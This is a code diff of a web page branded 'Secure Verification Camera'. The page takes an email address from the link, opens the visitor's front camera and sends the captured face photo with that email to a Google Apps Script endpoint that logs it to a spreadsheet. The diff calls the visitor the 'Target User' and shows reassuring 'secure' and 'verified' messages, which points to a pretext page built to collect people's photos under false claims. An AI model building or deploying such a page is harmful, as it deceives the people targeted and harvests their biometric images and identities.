@@ -3,32 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto-Email Secure Camera</title>
+    <title>Secure Verification Camera</title>
     <style>
-        body { font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #f0f2f5; margin: 0; }
-        .container { text-align: center; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
-        video { width: 100%; border-radius: 8px; margin-top: 10px; background: #000; transform: scaleX(-1); }
-        button { background-color: #007bff; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 6px; cursor: pointer; width: 100%; margin-top: 15px; font-weight: bold; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #f4f6f9; margin: 0; }
+        .container { text-align: center; background: white; padding: 25px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.08); width: 90%; max-width: 400px; }
+        h2 { margin-top: 0; color: #333; font-size: 22px; }
+        video { width: 100%; border-radius: 10px; margin-top: 10px; background: #000; transform: scaleX(-1); }
+        button { background-color: #007bff; color: white; border: none; padding: 14px 20px; font-size: 16px; border-radius: 8px; cursor: pointer; width: 100%; margin-top: 15px; font-weight: bold; transition: background 0.2s; }
         button:hover { background-color: #0056b3; }
-        #status { margin-top: 15px; font-weight: bold; color: #333; }
-        .user-info { font-size: 14px; color: #555; background: #e9ecef; padding: 8px; border-radius: 6px; margin-bottom: 10px; }
+        #status { margin-top: 15px; font-weight: 600; color: #555; font-size: 14px; }
+        .user-badge { font-size: 14px; color: #0056b3; background: #e3f2fd; padding: 10px; border-radius: 8px; margin-bottom: 15px; font-weight: bold; word-break: break-all; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>Verification Camera</h2>
-    <div class="user-info" id="emailDisplay">Checking User...</div>
+    <h2>Verification System</h2>
+    <div class="user-badge" id="emailDisplay">Checking Profile...</div>
     
     <video id="video" autoplay playsinline></video>
-    <button id="captureBtn">Verify & Submit</button>
+    <button id="captureBtn">Verify & Submit Photo</button>
     <canvas id="canvas" style="display:none;"></canvas>
-    <div id="status">Camera loading...</div>
+    <div id="status">Initializing camera...</div>
 </div>
 
 <script>
-    // 🚨 APNA GOOGLE APP SCRIPT URL YAHAN DAALEIN (Who has access: Anyone hona chahiye)
-    const webAppUrl = "https://script.google.com/macros/s/AKfycbzKTqJWHuVEGCB07bArH7ak7yOHPN--JBPtFYdfktJqc4dviVHaXZJJsCJNYxbpLaG9Tg/exec";
+    // 🚨 LO JII! APNA GOOGLE APP SCRIPT WAALA DEPLOY URL NICHE QUOTES "" KE ANDAR PASTE KAREIN:
+    const webAppUrl = "https://script.google.com/macros/s/AKfycbyUQA3OsvwWmzBMKyvh4jzGowfzoOLpph5PnYtH-uO5z68dRI38Lb_-wiKxNsAU6f5puw/exec";
 
     const video = document.getElementById('video');
     const captureBtn = document.getElementById('captureBtn');
@@ -36,49 +37,62 @@
     const statusDiv = document.getElementById('status');
     const emailDisplay = document.getElementById('emailDisplay');
 
-    // 🔥 SMART TRICK: URL se automatic email ID nikalna
+    // URL se automatic email ID param nikalna
     const urlParams = new URLSearchParams(window.location.search);
     let userEmail = urlParams.get('email');
 
-    if (userEmail) {
-        emailDisplay.innerText = "Verified User: " + userEmail;
+    if (userEmail && userEmail.includes("@")) {
+        emailDisplay.innerText = "Target User: " + userEmail;
     } else {
-        userEmail = "Anonymous_User";
-        emailDisplay.innerText = "User Profile: Not Logged In";
+        userEmail = "Unknown_User";
+        emailDisplay.innerText = "Profile Status: Open Session";
     }
 
-    // Camera Start (GitHub par 100% allow karega)
+    // Camera Start (GitHub Pages par smooth chalega)
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-        .then(stream => { video.srcObject = stream; statusDiv.innerText = "Camera Active"; })
-        .catch(err => { statusDiv.innerText = "❌ Camera Permission Denied!"; });
+        .then(stream => { 
+            video.srcObject = stream; 
+            statusDiv.innerText = "Camera Active & Secure"; 
+            statusDiv.style.color = "#28a745";
+        })
+        .catch(err => { 
+            statusDiv.innerText = "❌ Error: Camera permission denied!"; 
+            statusDiv.style.color = "#dc3545";
+        });
 
+    // Capture and Send
     captureBtn.addEventListener('click', () => {
-        statusDiv.innerText = "🔄 Capturing image...";
+        statusDiv.innerText = "🔄 Processing capture...";
+        statusDiv.style.color = "#007bff";
+        
         const context = canvas.getContext('2d');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         
-        // Mirror effect fix
+        // Mirror image fix karne ke liye settings
         context.translate(canvas.width, 0);
         context.scale(-1, 1);
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         
         const imageData = canvas.toDataURL('image/jpeg');
-        statusDiv.innerText = "📤 Saving to Google Sheet...";
+        statusDiv.innerText = "📤 Syncing with Google Sheets...";
 
-        // Data bhejba
+        // Google Sheet ko data payload bhejna
         fetch(webAppUrl, {
             method: "POST",
-            mode: "no-cors",
+            mode: "no-cors", // Browser cors issue bypass karne ke liye
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ image: imageData, email: userEmail })
         })
         .then(() => {
-            statusDiv.innerText = "✅ Saved Successfully!";
-            alert("Done! Aapki verification photo save ho gayi hai.");
+            statusDiv.innerText = "✅ Verified & Saved Successfully!";
+            statusDiv.style.color = "#28a745";
+            alert("Success! Aapka data secure save ho gaya hai.");
         })
         .catch(err => {
-            statusDiv.innerText = "❌ Network Error! Link re-check karein.";
+            statusDiv.innerText = "❌ Network Error! Please try again.";
+            statusDiv.style.color = "#dc3545";
+            console.error(err);
         });
     });
 </script>
